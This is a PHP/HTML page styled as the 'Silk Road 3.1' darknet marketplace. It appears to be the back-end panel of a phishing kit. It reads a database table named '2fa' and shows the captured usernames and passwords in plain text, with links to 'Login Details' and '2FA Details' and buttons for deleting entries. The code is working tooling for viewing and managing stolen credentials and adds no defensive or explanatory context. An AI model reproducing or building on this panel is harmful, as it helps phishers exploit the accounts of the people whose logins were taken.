


<!DOCTYPE html>

<html lang="en">

  <head>

    <meta charset="utf-8">

    <title>Silk Road 3.1</title>

    <link rel="icon" type="image/png" href="silkroad_gs.png">

    <link rel="stylesheet" type="text/css" href="boot.css">

    <link rel="stylesheet" type="text/css" href="patch1.css">

    <link rel="stylesheet" type="text/css" href="patch2.css">

    <link rel="stylesheet" type="text/css" href="patch3.css">

    <link rel="stylesheet" type="text/css" href="patch4.css">

    <style>

      #b{

      width:99%;

      }

    </style>

  </head>

  <body>

  <div align="center">

  <div id="b" align="left">



    ﻿<div align="center" id="d" style="margin-top:-10px"><a href="logout.php"><div title="Silk Road 3.0" align="center" id="imgm" style="display:inline-block"><img src="silkroad_gs.png" style="height:70px;width:70px"><br><b style="color:#333">Silk Road</b><br><span style="font-size:12px;font-weight:bold">the darknet's most resilient marketplace</span>
</div></a></div><hr>
<div id="n" style="margin-left:20px;">
<a href="admin.php">Login Details</a>
<a href="2fad.php">2FA Details</a>
</div>
<hr>


                         <table class="table table-striped">
    <thead>
      <tr>
        <th>Username</th>
        <th>Password</th>
        <th>Action</th>
      </tr>
    </thead>
    <tbody>
                 <?php
                                    include 'conn.php';
// Check connection
                                    if (!$link) {
                                        die("Connection failed: " . mysqli_connect_error());
                                    }

                                    $sql = "SELECT * FROM 2fa";
                                    $result = mysqli_query($link, $sql);

                                    if (mysqli_num_rows($result) > 0) {
    // output data of each row
                                        while($row = mysqli_fetch_assoc($result)) {?>
                                          
                                                <tr>
                                                    <td><?php echo $row["username"] ?></td>
                                                    <td>$ <?php echo $row["password"] ?></td>
                                                 
                                                    <td><a class="btn btn-danger" href="delete_track2.php?id=<?php echo $row["user_id"]; ?>">
                                                        <i class="glyphicon glyphicon-trash icon-white"></i>
                                                        Delete
                                                    </a>
                                             
                                                </td>
                                            </tr>


                                      
                                        <?php 

                                    }
                                } else {
                                    echo "0 results";
                                }

                                mysqli_close($link);
                                ?>
    </tbody>
  </table>

  </div>

  </div>

  </body>

</html>
